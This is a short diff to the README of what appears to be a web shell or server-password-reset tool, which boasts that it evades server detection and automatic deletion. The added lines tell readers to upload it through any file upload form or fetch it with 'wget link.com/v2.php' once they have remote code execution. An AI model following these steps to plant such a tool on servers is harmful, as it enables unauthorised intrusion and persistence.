@@ -15,3 +15,7 @@ How to usage? Check this https://www.naufalardhani.com/2018/10/tutorial-reset-pa
 # What are the advantages?
 - Can be uploaded to the server without bypass
 - It will not be deleted automatically by the server
+
+# How to usage
+- You can upload this tool via any file upload form and access it!
+- If you have a remote code access, you can write command like this 'wget link.com/v2.php'
